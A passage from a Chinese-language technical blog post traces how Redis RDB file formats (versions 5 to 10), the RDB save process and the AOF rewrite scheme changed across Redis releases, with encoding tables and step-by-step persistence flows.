（2）</td><td align="center">REDIS_RDB_TYPE_SET （2）</td></tr><tr><td align="center">REDIS_ZSET （3）</td><td align="center">REDIS_ENCODING_ZIPLIST （5）</td><td align="center">REDIS_RDB_TYPE_ZSET_ZIPLIST （12）</td></tr><tr><td align="center">REDIS_ZSET （3）</td><td align="center">REDIS_ENCODING_SKIPLIST （7）</td><td align="center">REDIS_RDB_TYPE_ZSET （3）</td></tr><tr><td align="center">REDIS_HASH （4）</td><td align="center">REDIS_ENCODING_ZIPLIST （5）</td><td align="center">REDIS_RDB_TYPE_HASH_ZIPLIST （13）</td></tr><tr><td align="center">REDIS_HASH （4）</td><td align="center">REDIS_ENCODING_HT （2）</td><td align="center">REDIS_RDB_TYPE_HASH （4）</td></tr></tbody></table></li></ul></li></ul><h3 id="2-1-5、版本五"><a href="#2-1-5、版本五" class="headerlink" title="2.1.5、版本五"></a>2.1.5、版本五</h3><ul><li><p>版本范围：2.5.6（当前不存在 2.5.x 版本，这其实是 2.6.0 的候选版本，2.5.6 版本的最新 <a href="https://github.com/redis/redis/commit/3f64694e7161075bbb48135379da205619c9b034">Commit</a>  ）</p></li><li><p>RDB版本号：0005</p></li><li><p>版本特点：</p><ul><li>支持 CRC64 的数据校验码；</li></ul></li><li><p>持久化数据内容：</p><ul><li><p>标记头尾信息；</p></li><li><p>多 DB 信息（ REDIS_RDB_OPCODE_SELECTDB ）；</p></li><li><p>过期时间属性（单位毫秒， REDIS_RDB_OPCODE_EXPIRETIME_MS ）；</p></li><li><p>不同的数据类型及编码：</p><table><thead><tr><th align="center">数据类型</th><th align="center">内存中编码类型</th><th align="center">RDB 文件中编码</th></tr></thead><tbody><tr><td align="center">REDIS_STRING （0）</td><td align="center">REDIS_ENCODING_RAW （0）</td><td align="center">REDIS_RDB_TYPE_STRING （0）</td></tr><tr><td align="center">REDIS_STRING （0）</td><td align="center">REDIS_ENCODING_INT （1）</td><td align="center">REDIS_RDB_TYPE_STRING （0）</td></tr><tr><td align="center">REDIS_LIST （1）</td><td align="center">REDIS_ENCODING_ZIPLIST （5）</td><td align="center">REDIS_RDB_TYPE_LIST_ZIPLIST （10）</td></tr><tr><td align="center">REDIS_LIST （1）</td><td align="center">REDIS_ENCODING_LINKEDLIST （4）</td><td align="center">REDIS_RDB_TYPE_LIST （1）</td></tr><tr><td align="center">REDIS_SET （2）</td><td align="center">REDIS_ENCODING_INTSET （6）</td><td align="center">REDIS_RDB_TYPE_SET_INTSET （11）</td></tr><tr><td align="center">REDIS_SET （2）</td><td align="center">REDIS_ENCODING_HT （2）</td><td align="center">REDIS_RDB_TYPE_SET （2）</td></tr><tr><td align="center">REDIS_ZSET （3）</td><td align="center">REDIS_ENCODING_ZIPLIST（5）</td><td align="center">REDIS_RDB_TYPE_ZSET_ZIPLIST （12）</td></tr><tr><td align="center">REDIS_ZSET （3）</td><td align="center">REDIS_ENCODING_SKIPLIST （7）</td><td align="center">REDIS_RDB_TYPE_ZSET （3）</td></tr><tr><td align="center">REDIS_HASH （4）</td><td align="center">REDIS_ENCODING_ZIPLIST（5）</td><td align="center">REDIS_RDB_TYPE_HASH_ZIPLIST （13）</td></tr><tr><td align="center">REDIS_HASH （4）</td><td align="center">REDIS_ENCODING_HT （2）</td><td align="center">REDIS_RDB_TYPE_HASH （4）</td></tr></tbody></table></li></ul><ul><li>CRC64 的 Checksum 校验码；</li></ul></li></ul><h3 id="2-1-6、版本六"><a href="#2-1-6、版本六" class="headerlink" title="2.1.6、版本六"></a>2.1.6、版本六</h3><ul><li><p>版本范围：2.6.0（2.5.7 版本其实就是 2.6.0 RC1） ～ 3.0.7 （以下分析基于 3.0.7 版本）</p></li><li><p>RDB版本号：0006</p></li><li><p>版本特点：</p><ul><li>ZIPLIST 编码细粒度优化，增加 8 比特 和 24 比特编码长度选项；</li></ul></li><li><p>持久化数据内容：</p><ul><li><p>标记头尾信息；</p></li><li><p>多 DB 信息（ REDIS_RDB_OPCODE_SELECTDB ）；</p></li><li><p>过期时间属性（单位毫秒， REDIS_RDB_OPCODE_EXPIRETIME_MS ）；</p></li><li><p>不同的数据类型及编码：</p><table><thead><tr><th align="center">数据类型</th><th align="center">内存中编码类型</th><th align="center">RDB 文件中编码</th></tr></thead><tbody><tr><td align="center">REDIS_STRING （0）</td><td align="center">REDIS_ENCODING_RAW （0）</td><td align="center">REDIS_RDB_TYPE_STRING （0）</td></tr><tr><td align="center">REDIS_STRING （0）</td><td align="center">REDIS_ENCODING_INT （1）</td><td align="center">REDIS_RDB_TYPE_STRING （0）</td></tr><tr><td align="center">REDIS_LIST （1）</td><td align="center">REDIS_ENCODING_ZIPLIST （5）</td><td align="center">REDIS_RDB_TYPE_LIST_ZIPLIST （10）</td></tr><tr><td align="center">REDIS_LIST （1）</td><td align="center">REDIS_ENCODING_LINKEDLIST （4）</td><td align="center">REDIS_RDB_TYPE_LIST （1）</td></tr><tr><td align="center">REDIS_SET （2）</td><td align="center">REDIS_ENCODING_INTSET （6）</td><td align="center">REDIS_RDB_TYPE_SET_INTSET （11）</td></tr><tr><td align="center">REDIS_SET （2）</td><td align="center">REDIS_ENCODING_HT （2）</td><td align="center">REDIS_RDB_TYPE_SET （2）</td></tr><tr><td align="center">REDIS_ZSET （3）</td><td align="center">REDIS_ENCODING_ZIPLIST （5）</td><td align="center">REDIS_RDB_TYPE_ZSET_ZIPLIST （12）</td></tr><tr><td align="center">REDIS_ZSET （3）</td><td align="center">REDIS_ENCODING_SKIPLIST （7）</td><td align="center">REDIS_RDB_TYPE_ZSET （3）</td></tr><tr><td align="center">REDIS_HASH （4）</td><td align="center">REDIS_ENCODING_ZIPLIST （5）</td><td align="center">REDIS_RDB_TYPE_HASH_ZIPLIST （13）</td></tr><tr><td align="center">REDIS_HASH （4）</td><td align="center">REDIS_ENCODING_HT （2）</td><td align="center">REDIS_RDB_TYPE_HASH （4）</td></tr></tbody></table></li><li><p>CRC64 的 Checksum 校验码；</p></li></ul></li></ul><h3 id="2-1-7、版本七"><a href="#2-1-7、版本七" class="headerlink" title="2.1.7、版本七"></a>2.1.7、版本七</h3><ul><li><p>版本范围：3.2.0 ～ 3.2.13 （以下分析基于 3.2.13 版本）</p></li><li><p>RDB版本号：0007</p></li><li><p>版本特点：</p><ul><li>增加了 Aux 字段用于记录额外的信息；</li><li>记录了 DB 数据量信息；</li><li>LIST 数据类型的编码优化： 由 ZIPLIST 和 LINKEDLIST 转换为 QUICKLIST ；</li></ul></li><li><p>持久化数据内容：</p><ul><li><p>标记头尾信息；</p></li><li><p>Aux 字段信息：</p><ul><li>redis-ver ： 当前 Redis 的版本；</li><li>redis-bits ： 当前机器位数，32 位或 64 位；</li><li>ctime ： 当前 RDB 文件的创建时间，单位秒；</li><li>used-mem ： 持久化时使用的内存大小；</li></ul></li><li><p>多 DB 信息 （ RDB_OPCODE_SELECTDB ）；</p></li><li><p>DB 的数据量信息 （ RDB_OPCODE_RESIZEDB ），包括 Key 数量以及过期 Key 数量，用于减少加载数据时 Dict 多次扩容的开销；</p></li><li><p>过期时间属性（单位毫秒， RDB_OPCODE_EXPIRETIME_MS ）；</p></li><li><p>不同的数据类型及编码：</p><table><thead><tr><th align="center">数据类型</th><th align="center">内存中编码类型</th><th align="center">RDB 文件中编码</th></tr></thead><tbody><tr><td align="center">OBJ_STRING （0）</td><td align="center">OBJ_ENCODING_RAW （0）</td><td align="center">RDB_TYPE_STRING （0）</td></tr><tr><td align="center">OBJ_STRING （0）</td><td align="center">OBJ_ENCODING_INT （1）</td><td align="center">RDB_TYPE_STRING （0）</td></tr><tr><td align="center">OBJ_LIST （1）</td><td align="center">OBJ_ENCODING_QUICKLIST （9）</td><td align="center">RDB_TYPE_LIST_QUICKLIST （14）</td></tr><tr><td align="center">OBJ_SET （2）</td><td align="center">OBJ_ENCODING_INTSET （6）</td><td align="center">RDB_TYPE_SET_INTSET （11）</td></tr><tr><td align="center">OBJ_SET （2）</td><td align="center">OBJ_ENCODING_HT （2）</td><td align="center">RDB_TYPE_SET （2）</td></tr><tr><td align="center">OBJ_ZSET （3）</td><td align="center">OBJ_ENCODING_ZIPLIST （5）</td><td align="center">RDB_TYPE_ZSET_ZIPLIST （12）</td></tr><tr><td align="center">OBJ_ZSET （3）</td><td align="center">OBJ_ENCODING_SKIPLIST （7）</td><td align="center">RDB_TYPE_ZSET （3）</td></tr><tr><td align="center">OBJ_HASH （4）</td><td align="center">OBJ_ENCODING_ZIPLIST （5）</td><td align="center">RDB_TYPE_HASH_ZIPLIST （13）</td></tr><tr><td align="center">OBJ_HASH （4）</td><td align="center">OBJ_ENCODING_HT （2）</td><td align="center">RDB_TYPE_HASH （4）</td></tr></tbody></table></li><li><p>CRC64 的 Checksum 校验码；</p></li></ul></li></ul><h3 id="2-1-8、版本八"><a href="#2-1-8、版本八" class="headerlink" title="2.1.8、版本八"></a>2.1.8、版本八</h3><ul><li><p>版本范围：4.0.0 ～ 4.0.14 （以下分析基于 4.0.14 版本）</p></li><li><p>RDB版本号：0008</p></li><li><p>版本特点：</p><ul><li>Aux 字段中增加主从复制相关信息；</li><li>支持 Module 类型数据的持久化；</li><li>优化了 ZSET 的 SKIPLIST 编码类型，ZSET 支持存储二进制数据；</li><li>首次支持将 RDB 持久化到 AOF 中；</li></ul></li><li><p>持久化数据内容：</p><ul><li><p>标记头尾信息；</p></li><li><p>Aux 字段信息（ RDB_OPCODE_AUX ）：</p><ul><li>redis-ver ： 当前 Redis 的版本；</li><li>redis-bits ： 当前机器位数，32 位或 64 位；</li><li>ctime ： 当前 RDB 文件的创建时间，单位秒；</li><li>used-mem ： 持久化时使用的内存大小；</li><li>aof-preamble ： 持久化 RDB 的数据是否位于 AOF 文件中；</li><li>repl-stream-db ： 主从复制时的当前 DBID （按需持久化）；</li><li>repl-id ： 主从复制的复制ID （按需持久化）；</li><li>repl-offset ： 主从复制的复制偏移量 （按需持久化）；</li></ul></li><li><p>多 DB 信息 （ RDB_OPCODE_SELECTDB ）；</p></li><li><p>DB 的数据量信息 （ RDB_OPCODE_RESIZEDB ），包括 Key 数量以及过期 Key 数量，用于减少加载数据时 Dict 多次扩容的开销；</p></li><li><p>过期时间属性（单位毫秒， RDB_OPCODE_EXPIRETIME_MS ）；</p></li><li><p>不同的数据类型及编码：</p><table><thead><tr><th align="center">数据类型</th><th align="center">内存中编码类型</th><th align="center">RDB 文件中编码</th></tr></thead><tbody><tr><td align="center">OBJ_STRING （0）</td><td align="center">OBJ_ENCODING_RAW （0）</td><td align="center">RDB_TYPE_STRING （0）</td></tr><tr><td align="center">OBJ_STRING （0）</td><td align="center">OBJ_ENCODING_INT （1）</td><td align="center">RDB_TYPE_STRING （0）</td></tr><tr><td align="center">OBJ_LIST （1）</td><td align="center">OBJ_ENCODING_QUICKLIST （9）</td><td align="center">RDB_TYPE_LIST_QUICKLIST （14）</td></tr><tr><td align="center">OBJ_SET （2）</td><td align="center">OBJ_ENCODING_INTSET （6）</td><td align="center">RDB_TYPE_SET_INTSET （11）</td></tr><tr><td align="center">OBJ_SET （2）</td><td align="center">OBJ_ENCODING_HT （2）</td><td align="center">RDB_TYPE_SET （2）</td></tr><tr><td align="center">OBJ_ZSET （3）</td><td align="center">OBJ_ENCODING_ZIPLIST （5）</td><td align="center">RDB_TYPE_ZSET_ZIPLIST （12）</td></tr><tr><td align="center">OBJ_ZSET （3）</td><td align="center">OBJ_ENCODING_SKIPLIST （7）</td><td align="center">RDB_TYPE_ZSET_2 （5）</td></tr><tr><td align="center">OBJ_HASH （4）</td><td align="center">OBJ_ENCODING_ZIPLIST （5）</td><td align="center">RDB_TYPE_HASH_ZIPLIST （13）</td></tr><tr><td align="center">OBJ_HASH （4）</td><td align="center">OBJ_ENCODING_HT （2）</td><td align="center">RDB_TYPE_HASH （4）</td></tr><tr><td align="center">OBJ_MODULE （5）</td><td align="center"></td><td align="center">RDB_TYPE_MODULE_2 （7）</td></tr></tbody></table></li><li><p>LUA 脚本；</p></li><li><p>CRC64 的 Checksum 校验码；</p></li></ul></li></ul><h3 id="2-1-9、版本九"><a href="#2-1-9、版本九" class="headerlink" title="2.1.9、版本九"></a>2.1.9、版本九</h3><ul><li><p>版本范围：5.0.0 ～ 6.2.7 （以下分析基于 6.2.7 版本）</p></li><li><p>RDB版本号：0009</p></li><li><p>版本特点：</p><ul><li>Module 的前后置信息字段，保存在 Aux 字段中；</li><li>保存 KV 对应的 LRU 和 LFU 信息；</li><li>支持 Stream 类型数据的持久化；</li></ul></li><li><p>持久化数据内容：</p><ul><li><p>标记头尾信息；</p></li><li><p>Aux 字段信息 （ RDB_OPCODE_MODULE_AUX ）：</p><ul><li>redis-ver ： 当前 Redis 的版本；</li><li>redis-bits ： 当前机器位数，32 位或 64 位；</li><li>ctime ： 当前 RDB 文件的创建时间，单位秒；</li><li>used-mem ： 持久化时使用的内存大小；</li><li>aof-preamble ：  持久化 RDB 的数据是否位于 AOF 文件中；</li><li>repl-stream-db ： 主从复制时的当前 DBID （按需持久化）；</li><li>repl-id ： 主从复制的复制ID （按需持久化）；</li><li>repl-offset ： 主从复制的复制偏移量 （按需持久化）；</li></ul></li><li><p>Module 的前置信息，常用于在加载 RDB 数据前进行 Module 模块信息的初始化；</p></li><li><p>多 DB 信息（ RDB_OPCODE_SELECTDB ）；</p></li><li><p>DB 的数据量信息，包括 Key 数量以及过期 Key 数量，用于减少加载数据时 Dict 多次扩容的开销；</p></li><li><p>过期时间属性（单位毫秒， RDB_OPCODE_EXPIRETIME_MS ）；</p></li><li><p>KV 的访问空闲时间信息（ RDB_OPCODE_IDLE ），当且仅当内存剔除策略是 LRU 相关；</p></li><li><p>KV 的访问频率信息（ RDB_OPCODE_FREQ ），当且仅当内存剔除策略时 LFU 相关；</p></li><li><p>不同的数据类型及编码：</p><table><thead><tr><th align="center">数据类型</th><th align="center">内存中编码类型</th><th align="center">RDB 文件中编码</th></tr></thead><tbody><tr><td align="center">OBJ_STRING （0）</td><td align="center">OBJ_ENCODING_RAW （0）</td><td align="center">RDB_TYPE_STRING （0）</td></tr><tr><td align="center">OBJ_STRING （0）</td><td align="center">OBJ_ENCODING_INT （1）</td><td align="center">RDB_TYPE_STRING （0）</td></tr><tr><td align="center">OBJ_LIST （1）</td><td align="center">OBJ_ENCODING_QUICKLIST （9）</td><td align="center">RDB_TYPE_LIST_QUICKLIST （14）</td></tr><tr><td align="center">OBJ_SET （2）</td><td align="center">OBJ_ENCODING_INTSET （6）</td><td align="center">RDB_TYPE_SET_INTSET （11）</td></tr><tr><td align="center">OBJ_SET （2）</td><td align="center">OBJ_ENCODING_HT （2）</td><td align="center">RDB_TYPE_SET （2）</td></tr><tr><td align="center">OBJ_ZSET （3）</td><td align="center">OBJ_ENCODING_ZIPLIST （5）</td><td align="center">RDB_TYPE_ZSET_ZIPLIST （12）</td></tr><tr><td align="center">OBJ_ZSET （3）</td><td align="center">OBJ_ENCODING_SKIPLIST （7）</td><td align="center">RDB_TYPE_ZSET_2 （5）</td></tr><tr><td align="center">OBJ_HASH （4）</td><td align="center">OBJ_ENCODING_ZIPLIST （5）</td><td align="center">RDB_TYPE_HASH_ZIPLIST （13）</td></tr><tr><td align="center">OBJ_HASH （4）</td><td align="center">OBJ_ENCODING_HT （2）</td><td align="center">RDB_TYPE_HASH （4）</td></tr><tr><td align="center">OBJ_STREAM （6）</td><td align="center"></td><td align="center">RDB_TYPE_STREAM_LISTPACKS （15）</td></tr><tr><td align="center">OBJ_MODULE （5）</td><td align="center"></td><td align="center">RDB_TYPE_MODULE_2 （7）</td></tr></tbody></table></li><li><p>LUA 脚本；</p></li><li><p>Module 的后置信息；</p></li><li><p>CRC64 的 Checksum 校验码；</p></li></ul></li></ul><h3 id="2-1-10、版本十"><a href="#2-1-10、版本十" class="headerlink" title="2.1.10、版本十"></a>2.1.10、版本十</h3><ul><li><p>版本范围：7.0.0 ～ 7.0.5 （以下分析基于 7.0.5 版本）</p></li><li><p>RDB版本号：0010</p></li><li><p>版本特点：</p><ul><li>LIST 数据类型的 QUICKLIST 编码优化；</li><li>STREAM 数据类型的 LISTPACKS 编码优化；</li><li>ZSET 数据类型的编码优化： 由 ZIPLIST 转换为 LISTPACK ；</li><li>HASH 数据类型的编码优化： 由 ZIPLIST 转换为 LISTPACK ；</li><li>支持 Function 脚本的持久化；</li><li>Aux 字段名称替换： aof-preamble 替换为 aof-base ；</li></ul></li><li><p>持久化数据内容：</p><ul><li><p>标记头尾信息；</p></li><li><p>Aux 字段信息（ RDB_OPCODE_AUX ）：</p><ul><li>redis-ver ： 当前 Redis 的版本；</li><li>redis-bits ： 当前机器位数，32 位或 64 位；</li><li>ctime ： 当前 RDB 文件的创建时间，单位秒；</li><li>used-mem ： 持久化时使用的内存大小；</li><li>aof-base ： 持久化 RDB 的数据是否位于 AOF 文件中；</li><li>repl-stream-db ： 主从复制时的当前 DBID （按需持久化）；</li><li>repl-id ： 主从复制的复制ID （按需持久化）；</li><li>repl-offset ： 主从复制的复制偏移量 （按需持久化）；</li></ul></li><li><p>Module 的前置信息，常用于在加载 RDB 数据前进行 Module 模块信息的初始化；</p></li><li><p>Function 脚本信息，包括 LUA 脚本信息；</p></li><li><p>多 DB 信息（ RDB_OPCODE_SELECTDB ）；</p></li><li><p>DB 的数据量信息（ RDB_OPCODE_RESIZEDB ），包括 Key 数量以及过期 Key 数量，用于减少加载数据时 Dict 多次扩容的开销；</p></li><li><p>过期时间属性（单位毫秒， RDB_OPCODE_EXPIRETIME_MS ）；</p></li><li><p>KV 的访问空闲时间信息（ RDB_OPCODE_IDLE ），当且仅当内存剔除策略是 LRU 相关；</p></li><li><p>KV 的访问频率信息（ RDB_OPCODE_FREQ ），当且仅当内存剔除策略时 LFU 相关；</p></li><li><p>不同的数据类型及编码：</p><table><thead><tr><th align="center">数据类型</th><th align="center">内存中编码类型</th><th align="center">RDB 文件中编码</th></tr></thead><tbody><tr><td align="center">OBJ_STRING （0）</td><td align="center">OBJ_ENCODING_RAW （0）</td><td align="center">RDB_TYPE_STRING （0）</td></tr><tr><td align="center">OBJ_STRING （0）</td><td align="center">OBJ_ENCODING_INT （1）</td><td align="center">RDB_TYPE_STRING （0）</td></tr><tr><td align="center">OBJ_LIST （1）</td><td align="center">OBJ_ENCODING_QUICKLIST （9）</td><td align="center">RDB_TYPE_LIST_QUICKLIST_2 （18）</td></tr><tr><td align="center">OBJ_SET （2）</td><td align="center">OBJ_ENCODING_INTSET （6）</td><td align="center">RDB_TYPE_SET_INTSET （11）</td></tr><tr><td align="center">OBJ_SET （2）</td><td align="center">OBJ_ENCODING_HT （2）</td><td align="center">RDB_TYPE_SET （2）</td></tr><tr><td align="center">OBJ_ZSET （3）</td><td align="center">OBJ_ENCODING_LISTPACK （11）</td><td align="center">RDB_TYPE_ZSET_LISTPACK （17）</td></tr><tr><td align="center">OBJ_ZSET （3）</td><td align="center">OBJ_ENCODING_SKIPLIST （7）</td><td align="center">RDB_TYPE_ZSET_2 （5）</td></tr><tr><td align="center">OBJ_HASH （4）</td><td align="center">OBJ_ENCODING_LISTPACK （11）</td><td align="center">RDB_TYPE_HASH_LISTPACK （16）</td></tr><tr><td align="center">OBJ_HASH （4）</td><td align="center">OBJ_ENCODING_HT （2）</td><td align="center">RDB_TYPE_HASH （4）</td></tr><tr><td align="center">OBJ_STREAM （6）</td><td align="center"></td><td align="center">RDB_TYPE_STREAM_LISTPACKS_2 （19）</td></tr><tr><td align="center">OBJ_MODULE （5）</td><td align="center"></td><td align="center">RDB_TYPE_MODULE_2 （7）</td></tr></tbody></table></li><li><p>Module 的后置信息；</p></li><li><p>CRC64 的 Checksum 校验码；</p></li></ul></li></ul><h2 id="2-2、持久化的数据流程演进"><a href="#2-2、持久化的数据流程演进" class="headerlink" title="2.2、持久化的数据流程演进"></a>2.2、持久化的数据流程演进</h2><h3 id="2-2-1、Redis-2-3系"><a href="#2-2-1、Redis-2-3系" class="headerlink" title="2.2.1、Redis 2&#x2F;3系"></a>2.2.1、Redis 2&#x2F;3系</h3><ul><li><p>版本范围：2.0.0 ～ 2.8.24 ， 3.0.0 ～ 3.2.13（以下分析基于 3.2.13 版本）</p></li><li><p>版本特点（仅关注RDB持久化流程的特点）：</p><ul><li>较为健全的持久化流程；</li></ul></li><li><p>持久化流程：</p><ul><li>主线程调用 fork 生成一个子进程，子进程执行数据持久化的逻辑；</li><li>子进程打开一个  <code>temp-$pid.rdb</code> 临时 rdb 文件，准备持久化内存中的数据；</li><li>子进程不断持久化各种数据，按需计算 Checksum ；</li><li>子进程调用 fflush 和 fsync 刷新缓存数据；</li><li>子进程将   <code>temp-$pid.rdb</code> 临时 rdb 文件重命名为配置的 rdb 名称；</li></ul></li></ul><h3 id="2-2-2、Redis-4系"><a href="#2-2-2、Redis-4系" class="headerlink" title="2.2.2、Redis 4系"></a>2.2.2、Redis 4系</h3><ul><li><p>版本范围：4.0.0 ～ 4.0.14（以下分析基于 4.0.14 版本）</p></li><li><p>版本特点（仅关注RDB持久化流程的特点）：</p><ul><li>子进程支持上报给父进程 CoW 内存使用情况；</li></ul></li><li><p>持久化流程：</p><ul><li>主线程开启一个消息通信管道（ server.child_info_pipe ）；</li><li>主线程调用 fork 生成一个子进程，子进程执行数据持久化的逻辑；</li><li>子进程打开一个  <code>temp-$pid.rdb</code> 临时 rdb 文件，准备持久化内存中的数据；</li><li>子进程不断持久化各种数据，按需计算 Checksum ；</li><li>子进程调用 fflush 和 fsync 刷新缓存数据；</li><li>子进程将   <code>temp-$pid.rdb</code> 临时 rdb 文件重命名为配置的 rdb 名称；</li><li>子进程通过消息管道（ 用于子进程上报给父进程 CoW 的内存使用量 ） 上报 CoW 内存使用量信息给父进程；</li></ul></li></ul><h3 id="2-2-3、Redis-5系"><a href="#2-2-3、Redis-5系" class="headerlink" title="2.2.3、Redis 5系"></a>2.2.3、Redis 5系</h3><ul><li><p>版本范围：5.0.0 ～ 5.0.14（以下分析基于 5.0.14 版本）</p></li><li><p>版本特点（仅关注RDB持久化流程的特点）：</p><ul><li>支持渐进式 fflush （ server.rdb_save_incremental_fsync ）；</li></ul></li><li><p>持久化流程：</p><ul><li>主线程开启一个消息通信管道（ server.child_info_pipe ）；</li><li>主线程调用 fork 生成一个子进程，子进程执行数据持久化的逻辑；</li><li>子进程打开一个  <code>temp-$pid.rdb</code> 临时 rdb 文件，准备持久化内存中的数据；</li><li>子进程不断持久化各种数据，按需计算 Checksum ， 按需间歇执行 fflush 刷新数据到硬盘 ；</li><li>子进程调用 fflush 和 fsync 刷新缓存数据；</li><li>子进程将   <code>temp-$pid.rdb</code> 临时 rdb 文件重命名为配置的 rdb 名称；</li><li>子进程通过消息管道（ 用于子进程上报给父进程 CoW 的内存使用量 ） 上报 CoW 内存使用量信息给父进程；</li></ul></li></ul><h3 id="2-2-4、Redis-6系"><a href="#2-2-4、Redis-6系" class="headerlink" title="2.2.4、Redis 6系"></a>2.2.4、Redis 6系</h3><ul><li><p>版本范围：6.0.0 ～ 6.2.7（以下分析基于 6.2.7 版本）</p></li><li><p>版本特点（仅关注RDB持久化流程的特点）：</p><ul><li>子进程支持更多的定制配置；</li><li>支持 Module 相关的事件消息通知；</li><li>子进程持久化数据过程中支持间歇上报持久化的 Key 的数量信息；</li></ul></li><li><p>持久化流程：</p><ul><li>主线程开启一个消息通信管道（ server.child_info_pipe ）；</li><li>主线程调用 fork 生成一个子进程，子进程执行数据持久化的逻辑；</li><li>子进程设置自己的 OOM Score ，特定的信号处理函数，绑定执行CPU （ server.bgsave_cpulist ）；</li><li>子进程打开一个  <code>temp-$pid.rdb</code> 临时 rdb 文件，准备持久化内存中的数据；</li><li>子进程启用一些 Module 相关的事件消息通知机制；</li><li>子进程不断持久化各种数据，按需计算 Checksum ， 按需间歇执行 fflush 刷新数据到硬盘，间歇上报给父进程持久化 Key 数量 ；</li><li>子进程调用 fflush 和 fsync 刷新缓存数据；</li><li>子进程将   <code>temp-$pid.rdb</code> 临时 rdb 文件重命名为配置的 rdb 名称；</li><li>子进程通过消息管道（ 用于子进程上报给父进程 CoW 的内存使用量 ） 上报 CoW 内存使用量信息给父进程；</li></ul></li></ul><h3 id="2-2-5、Redis-7系"><a href="#2-2-5、Redis-7系" class="headerlink" title="2.2.5、Redis 7系"></a>2.2.5、Redis 7系</h3><ul><li><p>版本范围：7.0.0 ～ 7.0.5（以下分析基于 7.0.5 版本）</p></li><li><p>版本特点（仅关注RDB持久化流程的特点）：</p><ul><li>引入 madvise(MADV_DONTNEED) 解决 CoW 内存增长过大的问题；</li><li>子进程补充 fsync 数据，避免数据文件元信息丢失；</li></ul></li><li><p>持久化流程：</p><ul><li>主线程开启一个消息通信管道（ server.child_info_pipe ）；</li><li>主线程调用 fork 生成一个子进程，子进程执行数据持久化的逻辑；</li><li>子进程设置自己的 OOM Score ，特定的信号处理函数，绑定执行CPU （ server.bgsave_cpulist ）；</li><li>子进程释放冗余的内存占用，避免 CoW 的开销；</li><li>子进程打开一个  <code>temp-$pid.rdb</code> 临时 rdb 文件，准备持久化内存中的数据；</li><li>子进程启用一些 Module 相关的事件消息通知机制；</li><li>子进程不断持久化各种数据（持久化后的数据直接释放，避免 CoW 开销），按需计算 Checksum ， 按需间歇执行 fflush 刷新数据到硬盘，间歇上报给父进程持久化 Key 数量 ；</li><li>子进程调用 fflush 和 fsync 刷新缓存数据；</li><li>子进程将   <code>temp-$pid.rdb</code> 临时 rdb 文件重命名为配置的 rdb 名称；</li><li>子进程按需执行 fsync rdb文件所在的目录，避免数据元信息丢失 （ fsyncFileDir 函数 ）；</li><li>子进程通过消息管道（ 用于子进程上报给父进程 CoW 的内存使用量 ） 上报 CoW 内存使用量信息给父进程；</li></ul></li></ul><h1 id="三、Redis-AOF-持久化演进史"><a href="#三、Redis-AOF-持久化演进史" class="headerlink" title="三、Redis AOF 持久化演进史"></a>三、Redis AOF 持久化演进史</h1><h2 id="3-1、Rewrite-AOF-方案"><a href="#3-1、Rewrite-AOF-方案" class="headerlink" title="3.1、Rewrite AOF 方案"></a>3.1、Rewrite AOF 方案</h2><ul><li><p>版本范围：2.2.0 ～ 2.8.24（以下分析基于 2.8.24 版本）</p></li><li><p>版本特点（仅关注AOF持久化流程的特点）：</p><ul><li>首次支持追加文件的持久化以及重写方案；</li><li>主线程追加堆积的增量变更命令到 AOF 中；</li><li>重写时支持渐进式 fflush （ server.aof_rewrite_incremental_fsync ）；</li></ul></li><li><p>追加持久化流程：</p><ul><li>Redis 执行完成相关命令后，按需将命令格式化追加到 server.aof_buf ，RESP 数据格式化规则：<ul><li>当出现 DB 切换后，会主动写一个 SELECT 命令到 AOF 中；</li><li>当执行 SETEX&#x2F;PSETEX 时，会持久化为 SET 和 PEXPIREAT 两个命令；</li></ul></li><li>Redis 定时将 server.aof_buf 中的数据写盘，主线程同步写盘；</li><li>数据写盘后，需要按照不同的刷盘策略将数据实际落盘，不同的刷盘策略为：<ul><li>AOF_FSYNC_NO ： 不主动执行 fsync ，依靠操作系统的刷盘逻辑；</li><li>AOF_FSYNC_ALWAYS ： 尝试每次写盘后都执行 fsync ；</li><li>AOF_FSYNC_EVERYSEC ：尝试每秒执行一次 fsync ；</li></ul></li></ul></li><li><p>重写持久化流程：</p><ul><li>主线程 fork 一个子进程执行持久化流程；</li><li>主线程开始堆积增量的 AOF 数据（ aofRewriteBufferAppend 函数）；</li><li>子进程打开一个  <code>temp-rewriteaof-$pid.aof</code> 临时 aof 文件，准备持久化内存中的数据；</li><li>子进程按照 RESP协议的持久化不同数据类型的数据，相关持久化规则为：<ul><li>当出现 DB 切换后，会拼接一个 SELECT 命令到 AOF 中；</li><li>REDIS_STRING 数据类型转换为一个 SET 命令；</li><li>REDIS_LIST 数据类型转换为一个或多个 RPUSH 命令 （默认每 64 个数据项拆分为一个命令）；</li><li>REDIS_SET 数据类型转换为一个或多个 SADD 命令 （默认每 64 个数据项拆分为一个命令）；</li><li>REDIS_ZSET 数据类型转换为一个或多个 ZADD 命令 （默认每 64 个数据项拆分为一个命令）；</li><li>REDIS_HASH 数据类型转换为一个或多个 HMSET 命令 （默认每 64 个数据项拆分为一个命令）；</li><li>带有过期属性的数据转换为一个 PEXPIREAT 命令；</li></ul></li><li>子进程将  <code>temp-rewriteaof-$pid.aof</code> 临时 aof 文件重命名为 <code>temp-rewriteaof-bg-$pid.aof</code> ；</li><li>父进程打开 <code>temp-rewriteaof-bg-$pid.aof</code> 文件，并追加堆积的增量的变更命令，之后将其重命名为配置的 AOF 名称；</li></ul></li></ul><p><img src="/assets/images/redis-persistence-rewriteaof.png" alt="RewriteAOF流程" loading="lazy"></p><h2 id="3-2、Rewrite-AOF-优化方案"><a href="#3-2、Rewrite-AOF-优化方案" class="headerlink" title="3.2、Rewrite AOF 优化方案"></a>3.2、Rewrite AOF 优化方案</h2><ul><li><p>版本范围：3.0.0 ～ 3.2.13（以下分析基于 3.2.13 版本）</p></li><li><p>版本特点（仅关注AOF持久化流程的特点）：</p><ul><li>过期时间操作的部分命令持久化为绝对时间；</li><li>父进程通过管道的方式发送追加的变更给持久化的子进程，减少父进程阻塞写 AOF 的时间开销；</li></ul></li><li><p>追加持久化流程：</p><ul><li>Redis 执行完成相关命令后，按需将命令格式化追加到 server.aof_buf ，RESP 数据格式化规则：<ul><li>当出现 DB 切换后，会主动写一个 SELECT 命令到 AOF 中；</li><li>当执行 EXPIRE&#x2F;PEXPIRE&#x2F;EXPIREAT 时，会持久化为 PEXPIREAT 命令；</li><li>当执行 SETEX&#x2F;PSETEX 时，会持久化为 SET 和 PEXPIREAT 两个命令；</li><li>当执行的 SET 命令带有 EX 或 PX 参数时，会持久化为 SET 和 PEXPIREAT 两个命令；</li></ul></li><li>Redis 定时将 server.aof_buf 